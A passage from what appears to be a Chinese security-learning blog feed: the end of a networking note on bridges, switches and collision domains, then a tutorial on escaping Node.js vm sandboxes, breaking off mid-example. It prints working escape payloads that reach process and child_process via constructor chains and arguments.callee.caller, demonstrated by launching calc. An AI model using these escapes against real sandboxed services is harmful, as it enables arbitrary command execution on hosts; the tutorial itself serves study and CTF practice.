alt="image-20240401233116459"></p></li><li><p>划分多个冲突域来扩展，冲突域就是一个冲突域内只能有一台主机和集线器连接，不然就会发生冲突</p><p><img src="http://cdn.clown2024.cn/202407151539821.png" alt="image-20240401233239090"></p><p>但是该方式的冲突效率降低了</p></li></ol><h2><span id="链路层扩展以太网">链路层扩展以太网</span></h2><p>一般使用网桥或者交换机</p><p><strong>网桥</strong></p><p>网桥根据MAC帧的目的地址对帧进行转发和过滤。当网桥收到一个帧时，并不向所有接口转发此帧，而是先检查此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把它丢弃(即过滤)。</p><p><img src="http://cdn.clown2024.cn/202407151539822.png" alt="image-20240401234933353"></p><p>网桥又分为两种：</p><ul><li><p>透明网桥：“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备-自学习</p><p><img src="http://cdn.clown2024.cn/202407151539823.png" alt="image-20240401235353540"></p><p>自学习指的就是会在数据发送的过程中逐渐填充转发表。</p></li><li><p>源路由网桥：在发送帧时，把详细的最佳路由信息(路由最少&#x2F;时间最短)放在帧的首部中。</p><p><strong>方法</strong>：源站以广播方式向欲通信的目的站发送一个发现帧</p></li></ul><p><strong>以太网交换机</strong></p><p>也叫做多接口网桥，一个交换机上有很多个端口，每一个端口都是一个冲突域。</p><p><img src="http://cdn.clown2024.cn/202407151539824.png" alt="image-20240401235818631"></p><p><strong>以太网交换机的两种交换方式</strong></p><ul><li><p>直通式交换机：查完目的地址(6B)就立刻转发。</p><p>延迟小，可靠性低，无法支持具有不同速率的端口的交换。</p></li><li><p>存储转发式交换机：将帧放入高速缓存，并检查否正确，正确则转发，错误则丢弃。<br>延迟大，可靠性高，可以支持具有不同速率的端口的交换。</p></li></ul><p><strong>交换机的自学习</strong></p><p><img src="http://cdn.clown2024.cn/202407151539825.png" alt="image-20240402000240493"></p><h2><span id="冲突域和广播域">冲突域和广播域</span></h2><p><strong>冲突域</strong></p><p>在同一个冲突域中的每一个节点都能收到所有被发送的帧；简单的说就是同一时间内只能有一台设备发送信息的范围。</p><p><strong>广播域</strong></p><p>网络中能接收任一设备发出的广播帧的所有设备的集合。简单的说如果站点发出一个广播信号，所有能接收收到这个信号的设备范围称为一个广播域。</p><p><img src="http://cdn.clown2024.cn/202407151539826.png" alt="image-20240402000502481"></p>]]></content>
      
      
      <categories>
          
          <category> 基础,计网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm2沙箱逃逸</title>
      <link href="/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E6%A6%82%E5%BF%B5">沙箱逃逸的概念</a></li><li><a href="#nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">Nodejs命令执行</a></li><li><a href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">vm沙箱逃逸</a><ul><li><a href="#vm%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8">vm模块的使用</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%B2%99%E7%AE%B1%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">利用沙箱来执行命令</a></li><li><a href="#vm%E7%BB%95%E8%BF%87objectcreatenull">vm绕过Object.create(null)</a></li></ul></li><li><a href="#vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">vm2沙箱逃逸</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a><ul><li><a href="#hfctf2020justescape">[HFCTF2020]JustEscape</a></li></ul></li></ul><!-- tocstop --><h1><span id="沙箱逃逸的概念">沙箱逃逸的概念</span></h1><ul><li>沙箱(sandbox)就是创建一个单独的运行代码的环境，和主机进行隔离，这样代码产生的危害就不会影响到主机，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li><li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</li><li>Nodejs中，通过vm模块来创建一个沙箱，但vm模块的漏洞较大，后续就出现了升级版的vm2，对vm做了优化，但是在旧版本仍然存在一些漏洞。</li></ul><p>那么沙箱逃逸就是字面意思，逃离该沙箱环境对主机进行影响，比如rce等。</p><h1><span id="nodejs命令执行">Nodejs命令执行</span></h1><p>要进行rce就要先了解一下Nodejs的执行命令的一些模块和函数。</p><p>参考文章：<a href="https://www.w3cschool.cn/nwfchn/omcvtozt.html">https://www.w3cschool.cn/nwfchn/omcvtozt.html</a></p><ul><li><p>eval()：这个函数跟php的效果一样，也是直接将字符串当作代码执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>child_process模块：该模块就是nodejs用来执行命令的模块</p><ul><li><p>exec()：该方法用来执行bash命令</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> exec=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>;<br><span class="hljs-keyword">var</span> whoami=<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>)&#123;<br>    <span class="hljs-keyword">if</span>(error)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">stack</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Error code: &#x27;</span>+error.<span class="hljs-property">code</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Child Process STDOUT: &#x27;</span>+stdout);<br>&#125;);<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754019.png" alt="image-20240309144449923"></p><p>exec方法的第一个参数是所要执行的shell命令，第二个参数是回调函数，该函数接受三个参数，分别是发生的错误、标准输出的显示结果、标准错误的显示结果。</p></li><li><p>execFile()：该方法直接执行特定的程序，参数作为数组传入，不会被bash解释，因此具有较高的安全性。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> execFile=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execFile</span>;<br><span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/bin/ls&#x27;</span>,[<span class="hljs-string">&#x27;-l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>],<span class="hljs-keyword">function</span>(<span class="hljs-params">error,result</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>spawn()：spawn方法创建一个子进程来执行特定命令，用法与execFile方法类似，但是没有回调函数，只能通过监听事件，来获取运行结果。它属于异步执行，适用于子进程长时间运行的情况。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> spawn=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">var</span> who=<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>who.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stdout: &#x27;</span>+data);<br>&#125;);<br>who.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stderr: &#x27;</span>+data)<br>&#125;);<br>who.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closing code: &#x27;</span>+code);<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754020.png" alt="image-20240309145912479"></p><p>spawn方法接受两个参数，第一个是可执行文件，第二个是参数数组。</p><p>spawn对象返回一个对象，代表子进程。该对象部署了EventEmitter接口，它的data事件可以监听，从而得到子进程的输出结果。</p><p>spawn方法与exec方法非常类似，只是使用格式略有区别。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">child_process.<span class="hljs-title function_">exec</span>(command, [options], callback)<br>child_process.<span class="hljs-title function_">spawn</span>(command, [args], [options])<br></code></pre></td></tr></table></figure></li><li><p>fork()：fork方法直接创建一个子进程，执行Node脚本，<code>fork(&#39;./child.js&#39;)</code> 相当于 <code>spawn(&#39;node&#39;, [&#39;./child.js&#39;])</code> 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = child_process.<span class="hljs-title function_">fork</span>(<span class="hljs-string">&#x27;./child.js&#x27;</span>);<br>n.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;PARENT got message:&#x27;</span>, m);<br>&#125;);<br>n.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">hello</span>: <span class="hljs-string">&#x27;world&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>上面代码中，fork方法返回一个代表进程间通信管道的对象，对该对象可以监听message事件，用来获取子进程返回的信息，也可以向子进程发送信息。</p><p>child.js脚本的内容如下。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;CHILD got message:&#x27;</span>, m);<br>&#125;);<br>process.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>上面代码中，子进程监听message事件，并向父进程发送信息。</p></li><li><p>send()：使用 child_process.fork() 生成新进程之后，就可以用 child.send(message, [sendHandle]) 向新进程发送消息。新进程中通过监听message事件，来获取消息。也就是上面fork示例的代码。</p></li></ul></li></ul><h1><span id="vm沙箱逃逸">vm沙箱逃逸</span></h1><p>参考文章：<a href="https://xz.aliyun.com/t/13427?time__1311=mqmxnDBQqeu4lxGg2DyeHDkQdexWwhD&alichlgref=https://www.google.com/">NodeJs vm沙箱逃逸 - 先知社区 (aliyun.com)</a></p><h2><span id="vm模块的使用">vm模块的使用</span></h2><ul><li><strong>vm.createContext([contextObject[, options]])</strong></li></ul><p>该模块在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8引擎为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p><img src="http://cdn.clown2024.cn/202407151754021.png" alt="image-20240309153446420"></p><ul><li><p>**vm.runInContext(code, contextifiedSandbox[, options])**：该函数参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p>runInContext需要配合createContext创建的沙箱来进行运行</p></li><li><p>所以这两个模块方法配合起来使用如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">globalVar</span>:<span class="hljs-number">10</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar*=2;console.log(globalVar);&#x27;</span>,sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754022.png" alt="image-20240309154253819"></p></li><li><p><strong>vm.runInThisContext(code[, options])</strong></p></li></ul><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。</p><p>这里需要注意的就是runInThisContext虽然是会创建相关的沙箱环境，可以访问到global上的全局变量，但是访问不到自定义的变量。</p><p><img src="http://cdn.clown2024.cn/202407151754023.png" alt="image-20240309154545749"></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Var</span>=<span class="hljs-number">123</span>;<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(globalVar);&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(Var);&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754024.png" alt="image-20240309154838701"></p><blockquote><p>可知可以访问全局变量，但自定义的不能访问，会报错。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><strong>vm.runInNewContext(code[, contextObject[, options]])</strong></li></ul><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象，不提供的话默认生成一个沙箱来进行使用。</p><blockquote><p>提一嘴Nodejs中数据类型可以分为两大类：基本类型和对象类型</p><p>基本类型包括以下六种：</p><ul><li>string：表示文本数据，用单引号或双引号包裹，如 ‘hello’ 或 “world”。</li><li>number：表示数值数据，可以是整数或小数，如 42 或 3.14。</li><li>boolean：表示逻辑数据，只有两个值，true 或 false。</li><li>null：表示空值，表示一个对象没有引用任何值。</li><li>undefined：表示未定义值，表示一个变量没有被赋值。</li><li>symbol：表示唯一的标识符，用 Symbol() 函数创建，如 Symbol(‘foo’)。</li></ul><p>那么除了这些基本类型的就是对象类型了。</p></blockquote><ul><li><p><strong>new vm.Script(code, options)：</strong>创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，指的是 code 中的变量、函数、对象等，不会自动成为全局作用域中的属性或成员。相反，它仅仅绑定于每次执行它的对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-comment">//script=new vm.Script(&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;)</span><br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;name=&quot;clown&quot;&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sandbox);<span class="hljs-comment">//&#123; name: &#x27;clown&#x27; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2><span id="利用沙箱来执行命令">利用沙箱来执行命令</span></h2><p>这里写一下不同沙箱执行命令的写法</p><ul><li><p><strong>runInThisContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">`process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)`</span>);<br></code></pre></td></tr></table></figure><p>然后就能弹计算器了</p><blockquote><p>这里了解一下为什么要这么写</p><ul><li><p>process：</p><p>process 对象是 Node.js 提供的一个全局变量，它包含了有关当前 Node.js 进程的信息和控制方法。</p><p>process 对象可以直接使用，而不需要通过 require() 引入，是因为它是一个预定义的全局对象，类似于 console、global、Buffer 等。</p><p>process 对象有很多有用的属性和方法，例如：</p><ul><li><p>process.env：可以获取或设置环境变量，如 process.env.NODE_ENV。</p></li><li><p>process.argv：可以获取命令行参数，如 process.argv[0]。</p></li><li><p>process.cwd()：可以获取当前工作目录，如 process.cwd()。</p></li><li><p>process.exit()：可以退出当前进程，如 process.exit(0)。</p></li><li><p>process.mainModule： 是 Node.js 提供的一个全局变量，它是一个对象，表示当前主模块的 Module 实例，主模块就是node执行的js。</p><p>它可以让你获取当前主模块的一些信息，例如它的文件名、路径、子模块等，比如process.mainModule.require。</p></li></ul></li><li><p>因为沙箱中没有 require() 函数，这是 Node.js 的一个全局函数，用于加载模块，但它不是 global 对象上的一个属性，而是在每个模块的本地作用域中定义的。从上面的作用域可以知道，require就是在node执行的js内定义的函数，而沙箱内部就是另一个独立的模块，所以是没有require函数的，需要从process.mainModule中获取。</p></li></ul></blockquote></li><li><p><strong>vm.runInContext(code, contextifiedSandbox[, options])</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> code=<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)();&#x27;</span>;<br><span class="hljs-comment">//vm.runInNewContext(`this.constructor.constructor(&#x27;return process&#x27;)()`);这样获取process对象也是可以的</span><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInContext</span>(code,sandbox);<br>res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>因为该方法的作用域是独立于global的，所以我们需要先获取global的process对象，然后就可以执行命令了。</p><blockquote><p>解释一下是怎么获取process对象的：</p><p>在沙箱中this指向全局环境中的{x:2}对象，这里通过调试可以看到</p><p><img src="http://cdn.clown2024.cn/202407151754025.png" alt="image-20240310094536377"></p><p>这个对象是不属于沙箱环境的，它属于全局环境，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><p>这是一个构造器链的图例：</p><p><img src="http://cdn.clown2024.cn/202407151754026.png" alt="image-20240309170145802"></p><p>所以上面的toString和constructor都是Object.prototype上的属性，所以这两种写法都可以。</p><p>构造器链的尽头是<code>Function</code>，Function的构造器是Function本身，所以利用原型链调用Function的构造函数之后就能获得process对象。</p></blockquote><p>所以只要是this是外部的引用都是可以来进行逃逸的，所以下面这样写也是可以的</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = &#123;<br>    <span class="hljs-attr">x</span>: []<br>&#125;;<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">&#x27;x.constructor.constructor(&quot;return process&quot;)()&#x27;</span>,sandbox);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><blockquote><p>但是如果x是是数字、字符串等primitive类型就无法逃逸出来，因为他们在传参的时候将数值传递过去，而不是引用属性，无法进一步调用<code>constructor</code></p></blockquote></li><li><p><strong>runInNewContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)();&#x27;</span>;<br><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInNewContext</span>(code);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><p>原理和上面的runInContext一样。</p></li><li><p><strong>new vm.Script(code, options)</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;</span>)<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">x</span>:[]&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br></code></pre></td></tr></table></figure><p>这里同理。</p></li></ul><h2><span id="vm绕过objectcreatenull">vm绕过Object.create(null)</span></h2><p>当我们的sandbox沙箱对象设置为null时，就无法通过this.construtor来获取Function的构造函数</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&quot;this.constructor.constructor(&#x27;return process&#x27;)().env&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-title function_">runInContext</span>(code,sandbox));<br></code></pre></td></tr></table></figure><p>上面的函数就会报如下错误</p><p><img src="http://cdn.clown2024.cn/202407151754027.png" alt="image-20240309183122332"></p><p>绕过一种方法就是利用<strong>arguments.callee.caller</strong></p><p>这里了解一下arguments是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">arguments 是一个类数组对象，它包含了传递给当前函数的所有参数。<br><br>arguments.callee 是 arguments 对象的一个属性，它表示当前正在执行的函数本身。<br><br>arguments.callee.caller 是 arguments.callee 对象的一个属性，它表示调用当前正在执行的函数的那个函数，也就是调用当前函数的外部函数。<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">foo</span>();<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">baz</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">bar</span>();<br>&#125;<br><span class="hljs-title function_">foo</span>();<br><span class="hljs-title function_">bar</span>();<br><span class="hljs-title function_">baz</span>();<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754028.png" alt="image-20240309183741062"></p><p>那思路就是在沙箱内定义一个函数，在沙箱外调用这个函数，那么这个函数的arguments.callee.caller则会返回沙箱外的一个对象，那么我们我们就可以在沙箱内进行逃逸了</p><p>那么下面的写法就可以进行绕过：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125;</span><br><span class="hljs-string">    a.toString = function () &#123;</span><br><span class="hljs-string">      const cc = arguments.callee.caller;</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span> + res);<br></code></pre></td></tr></table></figure><blockquote><p>说一下大概流程：</p><p>这里在沙箱内定义了一个函数将toString()进行了重写，我们在vm.runInContext(func, context)这里执行了该函数重写toString后返回了沙箱内的a对象，然后console.log的时候默认执行了toString()方法，这个时候cc获得的就是外部执行对象，然后我们就成功进行了逃逸。</p><p>这里也可以自己去调试一下会更加清晰。</p></blockquote><p>如果无法重写或触发toString()方法，还可以利用<strong>Proxy</strong>来劫持属性</p><p><strong>这里了解一下Proxy：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Proxy 对象是 JavaScript 提供的一个内置对象，它可以用来创建一个代理，用于拦截和修改目标对象的一些基本操作，例如属性的读取、赋值、删除、枚举、函数的调用等<br><br>Proxy 对象的用法是：<br><br>创建一个 Proxy 对象，需要使用 new Proxy(target, handler) 构造函数，传入两个参数，分别是目标对象和处理器对象。<br>目标对象是要被代理的对象，可以是任何类型的对象，例如数组、函数、另一个代理等。<br>处理器对象是一个普通的对象，它定义了一些拦截函数（也称为陷阱），用于拦截和修改目标对象的基本操作。<br></code></pre></td></tr></table></figure><p>这是一个例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//get</span><br><span class="hljs-keyword">let</span> numbers=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span 